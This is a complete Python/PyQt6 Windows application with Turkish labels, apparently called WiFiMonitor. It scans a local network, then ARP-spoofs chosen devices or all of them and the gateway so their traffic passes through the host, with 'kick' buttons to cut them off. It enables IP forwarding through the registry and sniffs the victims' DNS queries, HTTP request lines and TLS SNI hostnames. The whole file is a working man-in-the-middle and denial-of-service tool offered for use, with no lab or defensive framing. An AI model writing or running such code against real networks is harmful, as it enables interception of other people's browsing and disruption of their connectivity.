# language: Python 3.10+, file: wifimon_gui.py, target: Windows 11 + Npcap + admin
import sys, os, time, threading, ipaddress, subprocess, ctypes
from datetime import datetime

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QComboBox, QLineEdit, QPushButton, QTableWidget, QTableWidgetItem,
    QTextEdit, QLabel, QMessageBox, QHeaderView, QAbstractItemView,
)
from PyQt6.QtCore import Qt, pyqtSignal
from PyQt6.QtGui import QFont

try:
    from scapy.all import (
        ARP, Ether, IP, TCP, DNSQR, Raw,
        srp, sendp, sniff, get_if_hwaddr,
    )
    from scapy.arch.windows import get_windows_if_list
except ImportError as e:
    ctypes.windll.user32.MessageBoxW(0, f"scapy eksik: {e}", "Hata", 0x10)
    sys.exit(1)

try:
    from hostlens import identify
except ImportError:
    identify = None


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def enable_ip_forwarding():
    try:
        subprocess.run(
            ["reg", "add",
             r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
             "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
            check=False, capture_output=True,
        )
    except Exception:
        pass


def list_ifaces():
    out = []
    for i in get_windows_if_list():
        name = i.get("name", "")
        desc = i.get("description", "")
        ips = i.get("ips", [])
        ipv4 = next((x for x in ips if ":" not in x), None)
        if ipv4:
            out.append({"name": name, "desc": desc, "ip": ipv4})
    return out


def guess_gateway(iface_ip):
    net = ipaddress.ip_network(iface_ip + "/24", strict=False)
    return str(net.network_address + 1)


def resolve_mac(iface, ip):
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2, iface=iface, verbose=0,
    )
    return ans[0][1].hwsrc if ans else None


def arp_scan(iface, network):
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
        timeout=3, iface=iface, verbose=0,
    )
    return [(recv.psrc, recv.hwsrc) for _, recv in ans]


def clear_arp_cache(ip):
    try:
        subprocess.run(["arp", "-d", ip], capture_output=True, check=False)
    except Exception:
        pass


class Poisoner:
    def __init__(self, iface, target_ip, target_mac, gw_ip, gw_mac, log_cb):
        self.iface = iface
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.gw_ip = gw_ip
        self.gw_mac = gw_mac
        self.log_cb = log_cb
        self.stop_event = threading.Event()
        self.thread = None

    def start(self):
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def _run(self):
        my_mac = get_if_hwaddr(self.iface)
        to_target = Ether(dst=self.target_mac, src=my_mac) / ARP(
            op=2, psrc=self.gw_ip, hwsrc=my_mac,
            pdst=self.target_ip, hwdst=self.target_mac)
        to_gw = Ether(dst=self.gw_mac, src=my_mac) / ARP(
            op=2, psrc=self.target_ip, hwsrc=my_mac,
            pdst=self.gw_ip, hwdst=self.gw_mac)
        self.log_cb(f"[KICK] {self.target_ip} hedef alindi")
        try:
            while not self.stop_event.is_set():
                sendp([to_target, to_gw], iface=self.iface, verbose=0)
                time.sleep(1.0)
        finally:
            r1 = Ether(dst=self.target_mac, src=self.gw_mac) / ARP(
                op=2, psrc=self.gw_ip, hwsrc=self.gw_mac,
                pdst=self.target_ip, hwdst=self.target_mac)
            r2 = Ether(dst=self.gw_mac, src=self.target_mac) / ARP(
                op=2, psrc=self.target_ip, hwsrc=self.target_mac,
                pdst=self.gw_ip, hwdst=self.gw_mac)
            sendp([r1, r2], iface=self.iface, count=5, verbose=0)
            self.log_cb(f"[KICK] {self.target_ip} ARP restore edildi")

    def stop(self):
        self.stop_event.set()


class Sniffer:
    def __init__(self, iface, log_cb):
        self.iface = iface
        self.log_cb = log_cb
        self.seen = set()
        self.stop_event = threading.Event()
        self.thread = None

    def start(self):
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def _handle(self, pkt):
        if self.stop_event.is_set() or not pkt.haslayer(IP):
            return
        src = pkt[IP].src

        if pkt.haslayer(DNSQR) and pkt[DNSQR].qname:
            host = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
            self._emit("DNS", src, host)
            return

        if pkt.haslayer(TCP) and pkt[TCP].dport in (80, 8080):
            raw = bytes(pkt[TCP].payload)
            if raw.startswith((b"GET ", b"POST ", b"Host:")):
                line = raw.split(b"\r\n", 1)[0][:120].decode(errors="ignore")
                self._emit("HTTP", src, line)
            return

        if pkt.haslayer(TCP) and pkt[TCP].dport == 443 and pkt.haslayer(Raw):
            raw = bytes(pkt[Raw].load)
            if len(raw) > 5 and raw[0] == 0x16:
                idx = raw.find(b"\x00\x00")
                if idx != -1 and idx + 9 <= len(raw):
                    try:
                        ln = int.from_bytes(raw[idx + 7:idx + 9], "big")
                        if 0 < ln < 256 and idx + 9 + ln <= len(raw):
                            sni = raw[idx + 9:idx + 9 + ln].decode("ascii", errors="ignore").strip("\x00")
                            if "." in sni:
                                self._emit("TLS", src, sni)
                    except Exception:
                        pass

    def _emit(self, tag, ip, host):
        key = (ip, host)
        if key in self.seen:
            return
        self.seen.add(key)
        self.log_cb(f"[{tag}] {ip:<15} -> {host}")

    def _run(self):
        sniff(iface=self.iface, prn=self._handle, store=False,
              stop_filter=lambda _: self.stop_event.is_set())

    def stop(self):
        self.stop_event.set()


class MainWindow(QMainWindow):
    log_signal = pyqtSignal(str)
    scan_done_signal = pyqtSignal(list)
    scan_fail_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.setWindowTitle("WiFiMonitor")
        self.resize(1100, 700)

        self.devices = []
        self.sniffer = None
        self.poisoners = []

        self._build_ui()
        self._apply_dark_theme()

        self.log_signal.connect(self._append_log)
        self.scan_done_signal.connect(self._on_scan_done)
        self.scan_fail_signal.connect(self._on_scan_fail)

        self.refresh_ifaces()

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(12, 12, 12, 12)
        layout.setSpacing(8)

        top = QHBoxLayout()
        top.addWidget(QLabel("Adaptör:"))
        self.iface_cb = QComboBox()
        self.iface_cb.setMinimumWidth(400)
        self.iface_cb.currentIndexChanged.connect(self._autofill_gw)
        top.addWidget(self.iface_cb)
        btn_refresh = QPushButton("Yenile")
        btn_refresh.clicked.connect(self.refresh_ifaces)
        top.addWidget(btn_refresh)
        top.addStretch()
        layout.addLayout(top)

        row2 = QHBoxLayout()
        row2.addWidget(QLabel("Gateway:"))
        self.gw_entry = QLineEdit()
        self.gw_entry.setMaximumWidth(160)
        row2.addWidget(self.gw_entry)
        btn_scan = QPushButton("Ağı Tara")
        btn_scan.clicked.connect(self.scan)
        row2.addWidget(btn_scan)
        self.sniff_btn = QPushButton("İzlemeyi Başlat")
        self.sniff_btn.clicked.connect(self.toggle_sniff)
        row2.addWidget(self.sniff_btn)
        btn_clear = QPushButton("Temizle")
        btn_clear.clicked.connect(self.clear_log)
        row2.addWidget(btn_clear)
        row2.addStretch()
        layout.addLayout(row2)

        mid = QHBoxLayout()
        self.table = QTableWidget(0, 5)
        self.table.setHorizontalHeaderLabels(["IP", "MAC", "Üretici", "Model", "Durum"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        mid.addWidget(self.table, stretch=3)

        btn_col = QVBoxLayout()
        btn_kick = QPushButton("Seçili Cihazı At")
        btn_kick.clicked.connect(self.kick_selected)
        btn_col.addWidget(btn_kick)
        btn_kick_all = QPushButton("Tümünü At")
        btn_kick_all.clicked.connect(self.kick_all)
        btn_col.addWidget(btn_kick_all)
        btn_stop = QPushButton("Atmayı Durdur")
        btn_stop.clicked.connect(self.stop_kicks)
        btn_col.addWidget(btn_stop)
        btn_col.addStretch()
        mid.addLayout(btn_col)
        layout.addLayout(mid, stretch=2)

        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setFont(QFont("Consolas", 9))
        layout.addWidget(self.log, stretch=1)

    def _apply_dark_theme(self):
        self.setStyleSheet("""
            QMainWindow, QWidget { background-color: #1e1e2e; color: #cdd6f4; }
            QLabel { color: #cdd6f4; font-size: 13px; }
            QComboBox, QLineEdit {
                background-color: #313244; color: #cdd6f4;
                border: 1px solid #45475a; border-radius: 6px;
                padding: 6px 10px; font-size: 13px;
            }
            QComboBox::drop-down { border: none; }
            QComboBox QAbstractItemView {
                background-color: #313244; color: #cdd6f4;
                selection-background-color: #585b70;
            }
            QPushButton {
                background-color: #89b4fa; color: #1e1e2e;
                border: none; border-radius: 6px;
                padding: 8px 16px; font-weight: bold; font-size: 13px;
            }
            QPushButton:hover { background-color: #b4befe; }
            QPushButton:pressed { background-color: #74c7ec; }
            QTableWidget {
                background-color: #181825; color: #cdd6f4;
                border: 1px solid #313244; border-radius: 8px;
                gridline-color: #313244;
                selection-background-color: #45475a;
                font-size: 13px;
            }
            QHeaderView::section {
                background-color: #313244; color: #cdd6f4;
                border: none; padding: 8px; font-weight: bold;
            }
            QTextEdit {
                background-color: #11111b; color: #a6e3a1;
                border: 1px solid #313244; border-radius: 8px;
                padding: 8px; font-size: 12px;
            }
        """)

    def refresh_ifaces(self):
        ifaces = list_ifaces()
        self.iface_map = {f"{i['name']}  ({i['ip']})": i for i in ifaces}
        self.iface_cb.clear()
        self.iface_cb.addItems(list(self.iface_map.keys()))
        if self.iface_map:
            self.iface_cb.setCurrentIndex(0)
            self._autofill_gw()

    def _selected_iface(self):
        key = self.iface_cb.currentText()
        return self.iface_map.get(key)

    def _autofill_gw(self):
        iface = self._selected_iface()
        if iface:
            self.gw_entry.setText(guess_gateway(iface["ip"]))

    def scan(self):
        iface = self._selected_iface()
        if not iface:
            QMessageBox.warning(self, "Uyarı", "Adaptör seç.")
            return
        net = iface["ip"] + "/24"
        self._append_log(f"[*] Tarama başlatıldı: {net}")
        self.table.setRowCount(0)
        self.devices = []
        threading.Thread(
            target=self._scan_worker,
            args=(iface["name"], net),
            daemon=True,
        ).start()

    def _scan_worker(self, iface_name, net):
        try:
            hosts = arp_scan(iface_name, net)
        except Exception as e:
            self.scan_fail_signal.emit(f"Tarama hatası: {e}")
            return
        results = []
        for ip, mac in hosts:
            vendor = "?"
            model = "?"
            if identify:
                try:
                    dev = identify(ip)
                    if getattr(dev, "manufacturer", None):
                        vendor = dev.manufacturer
                    if getattr(dev, "model", None):
                        model = dev.model
                    elif getattr(dev, "friendly_name", None):
                        model = dev.friendly_name
                except Exception:
                    pass
            results.append((ip, mac, vendor, model))
        self.scan_done_signal.emit(results)

    def _on_scan_done(self, results):
        self.devices = results
        for ip, mac, vendor, model in results:
            row = self.table.rowCount()
            self.table.insertRow(row)
            self.table.setItem(row, 0, QTableWidgetItem(ip))
            self.table.setItem(row, 1, QTableWidgetItem(mac))
            self.table.setItem(row, 2, QTableWidgetItem(vendor))
            self.table.setItem(row, 3, QTableWidgetItem(model))
            self.table.setItem(row, 4, QTableWidgetItem("çevrimiçi"))
        self._append_log(f"[*] {len(results)} cihaz bulundu")

    def _on_scan_fail(self, msg):
        self._append_log(f"[!] {msg}")
        QMessageBox.critical(self, "Tarama hatası", msg)

    def toggle_sniff(self):
        if self.sniffer:
            self.sniffer.stop()
            self.sniffer = None
            self.sniff_btn.setText("İzlemeyi Başlat")
            self._append_log("[*] İzleme durduruldu")
            return
        iface = self._selected_iface()
        if not iface:
            QMessageBox.warning(self, "Uyarı", "Adaptör seç.")
            return
        self.sniffer = Sniffer(iface["name"], self._append_log)
        self.sniffer.start()
        self.sniff_btn.setText("İzlemeyi Durdur")
        self._append_log(f"[*] İzleme başladı: {iface['name']}")

    def _prep_kick(self):
        iface = self._selected_iface()
        if not iface:
            QMessageBox.warning(self, "Uyarı", "Adaptör seç.")
            return None
        gw_ip = self.gw_entry.text().strip()
        if not gw_ip:
            QMessageBox.warning(self, "Uyarı", "Gateway IP gir.")
            return None
        gw_mac = resolve_mac(iface["name"], gw_ip)
        if not gw_mac:
            QMessageBox.critical(self, "Hata", f"Gateway MAC bulunamadı: {gw_ip}")
            return None
        enable_ip_forwarding()
        return iface["name"], gw_ip, gw_mac

    def kick_selected(self):
        sel = self.table.selectionModel().selectedRows()
        if not sel:
            QMessageBox.warning(self, "Uyarı", "Tablodan cihaz seç.")
            return
        prep = self._prep_kick()
        if not prep:
            return
        iface_name, gw_ip, gw_mac = prep
        for idx in sel:
            row = idx.row()
            ip = self.table.item(row, 0).text()
            mac = self.table.item(row, 1).text()
            clear_arp_cache(ip)
            p = Poisoner(iface_name, ip, mac, gw_ip, gw_mac, self._append_log)
            p.start()
            self.poisoners.append(p)

    def kick_all(self):
        if not self.devices:
            QMessageBox.warning(self, "Uyarı", "Önce ağı tara.")
            return
        if QMessageBox.question(self, "Onay", "Tüm cihazlar atılsın mı?") != QMessageBox.StandardButton.Yes:
            return
        prep = self._prep_kick()
        if not prep:
            return
        iface_name, gw_ip, gw_mac = prep
        for ip, mac, _, _ in self.devices:
            if ip == gw_ip:
                continue
            clear_arp_cache(ip)
            p = Poisoner(iface_name, ip, mac, gw_ip, gw_mac, self._append_log)
            p.start()
            self.poisoners.append(p)

    def stop_kicks(self):
        for p in self.poisoners:
            p.stop()
        self.poisoners.clear()
        self._append_log("[*] Atma durduruluyor, ARP restore ediliyor...")

    def _append_log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log.append(f"[{ts}] {msg}")

    def clear_log(self):
        self.log.clear()


if __name__ == "__main__":
    if not is_admin():
        ctypes.windll.user32.MessageBoxW(
            0, "Yönetici olarak çalıştır.", "WiFiMonitor", 0x10)
        sys.exit(1)
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())